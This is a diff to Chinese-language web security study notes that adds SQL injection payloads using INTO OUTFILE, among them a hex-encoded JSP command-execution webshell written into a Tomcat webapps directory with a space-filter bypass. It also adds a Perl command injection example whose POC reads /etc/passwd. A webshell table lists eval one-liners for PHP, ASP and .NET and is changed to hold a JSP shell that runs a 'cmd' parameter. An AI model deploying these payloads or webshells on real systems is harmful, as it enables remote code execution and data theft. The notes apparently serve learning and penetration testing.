@@ -339,6 +339,24 @@ print_r($uc->test);
 - 猜解列数`flag' union select 1,2,3 #`, 返回的数据为1, 2, 3
 - 猜解数据库名, 表名`flag' and exist(select * from xxx) #`或`' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #`, 使用`and 0`先将干扰数据清零, 再查询`INFORMATION_SCHEMA`库中的`COLUMNS`表获取数据库名和表名
 - 猜解列名, 数据类型`flag' and exist(select xxx from xxx) #`或`' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='xxx'#`
+- 写入文件: `select "hackkkk" into outfile "/tmp/hackkkk.jsp";`
+- 在文件开头写入内容:
+
+    ```bash
+    mysql> select "hackkkk" into outfile "/tmp/hackkk.jsp" LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e;
+    Query OK, 1 row affected (0.02 sec)
+    mysql> quit
+    Bye
+    $ cat /tmp/hackkk.jsp
+    <?php phpinfo();?>hackkkk
+    ```
+
+- 将[jsp一句话木马](#_11)转换为十六进制`3c25696628726571756573742e676574506172616d657465722822636d642229213d6e756c6c297b6a6176612e696f2e496e70757453747265616d20696e3d52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d6f75742e7072696e7428223c2f7072653e22293b7d253e`
+- 先闭合原字符串, 再加`#`忽略后面语句, 中间添加POC: 使用`/**/`绕过空格校验, 在union的时候, 注意前后查询的参数个数相同
+
+    ```
+    zzz'/**/union/**/select+0x3c25696628726571756573742e676574506172616d657465722822636d642229213d6e756c6c297b6a6176612e696f2e496e70757453747265616d20696e3d52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d6f75742e7072696e7428223c2f7072653e22293b7d253e+into+outfile+'/usr/local/tomcat/webapps/ucenter/kk.jsp'#
+    ```
 
 ### 框架
 
@@ -622,6 +640,24 @@ public class OSi {
 
 !!! quote "[OS命令注入](../../coding/go/go%E8%AF%AD%E8%A8%80%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/#os)"
 
+### Perl
+
+- system()
+
+    ```perl
+    # $username为用户输入
+    $username = param ("username");
+    # 使用$username拼接命令
+    system ("cat /usr/stats/$username");
+    # POC: xxx; cat /etc/passwd
+    # 正常情况调用execvp()来运行“cat”, 如果包含Shell元字符, 则通过Shell来解释
+
+    # 消减措施: 作为参数列表, 但是存在路径跨越如:../../etc/passwd
+    system ("cat", "/usr/stats/$username");
+    ```
+
+- exec()
+
 
 ## OGNL注入
 
@@ -637,7 +673,7 @@ public class OSi {
     php | `<?php @eval($_POST['passwd']);?>`
     asp | `<%eval request(“passwd")%>`
     .net | `<%@ Page Language="Jscript"%><%eval(Request.Item["passwd"],"unsafe");%>`
-    jsp | `<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>`
+    jsp | `<%if(request.getParameter("cmd")!=null){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>`
 
 1. 如果前台校验了后缀名, 抓包修改后缀名
 1. 在路径中添加`../`将webshell上传到可执行目录
